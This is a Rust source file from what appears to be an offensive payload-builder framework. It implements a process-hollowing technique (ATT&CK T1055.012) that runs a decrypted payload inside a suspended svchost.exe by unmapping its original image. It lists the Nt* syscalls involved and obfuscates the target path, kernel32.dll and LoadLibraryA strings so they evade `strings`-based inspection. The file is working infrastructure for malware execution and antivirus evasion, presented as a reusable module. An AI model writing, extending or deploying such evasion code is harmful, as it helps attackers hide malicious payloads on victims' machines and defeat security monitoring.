//! Process hollowing.
//!
//! Runs the decrypted payload inside a suspended, legitimate process
//! (`svchost.exe` by default) by unmapping its original image and replacing it
//! with the payload's image. See `README.md` for the full write-up.

use serde::{Deserialize, Serialize};

use crate::config::schema::PayloadFormat;
use crate::engine::obfuscation::StringsConfig;

use super::{Capability, Category, Stability, TechniqueDef};

/// Parameters for process hollowing.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Params {
    /// Path of the process to create, suspend and hollow.
    #[serde(default = "default_target")]
    pub target: String,
}

/// Default target process for process hollowing.
pub fn default_target() -> String {
    r"C:\Windows\System32\svchost.exe".to_string()
}

impl Default for Params {
    /// Defaults to hollowing `svchost.exe` (see [`default_target`]).
    fn default() -> Self {
        Self {
            target: default_target(),
        }
    }
}

/// Static metadata for process hollowing.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "process_hollowing",
    attck: &["T1055.012"],
    stability: Stability::Experimental,
    requires: &[Capability::WindowsX64],
    conflicts: &[],
    category: Category::Execution,
    doc_path: "src/techniques/process_hollowing/README.md",
    stub_fragment: include_str!("stub_fragment.rs"),
    params_example: r#"technique: process_hollowing
params:
  target: "C:\\Windows\\System32\\svchost.exe""#,
    readme: include_str!("README.md"),
    syscalls: &[
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtReadVirtualMemory",
        "NtResumeThread",
        "NtUnmapViewOfSection",
        "NtProtectVirtualMemory",
        "NtSuspendThread",
    ],
    resolves_imports: true,
};

impl Params {
    /// Renders the process-hollowing stub fragment for these parameters.
    ///
    /// The per-build target path and the remote-DLL-load resolver's
    /// `kernel32.dll` / `LoadLibraryA` names are substituted into the
    /// fragment's placeholders as code that rebuilds them at runtime (using
    /// `strings`'s active strategy), so none of them appears in `strings`.
    /// The `ntdll.dll` / `NtUnmapViewOfSection` / `NtProtectVirtualMemory` /
    /// `NtSuspendThread` names moved to the syscall layer (`engine::syscalls`),
    /// which obfuscates them the same way.
    pub fn render_fragment(&self, strings: &StringsConfig) -> String {
        let target_def = strings
            .obfuscate(&self.target)
            .render_stub_expr("hollow_target");
        let kernel32_def = strings
            .obfuscate("kernel32.dll")
            .render_stub_expr("kernel32_name");
        let load_library_def = strings
            .obfuscate("LoadLibraryA")
            .render_stub_expr("load_library_name");
        DEF.stub_fragment
            .replace("$HOLLOW_TARGET_DEF$", &target_def)
            .replace("$KERNEL32_DEF$", &kernel32_def)
            .replace("$LOAD_LIBRARY_DEF$", &load_library_def)
    }

    /// Renders the fragment for the payload's binary format.
    ///
    /// `process_hollowing` replaces a suspended process's image, so it only
    /// runs a PE executable. `config::validate` rejects `format: dll`/
    /// `shellcode` before this runs; the parameter is accepted (and ignored) to
    /// keep the execution-technique contract uniform with `reflective_loading`.
    pub fn render_fragment_for(&self, strings: &StringsConfig, _format: PayloadFormat) -> String {
        self.render_fragment(strings)
    }
}

#[cfg(test)]
mod tests;
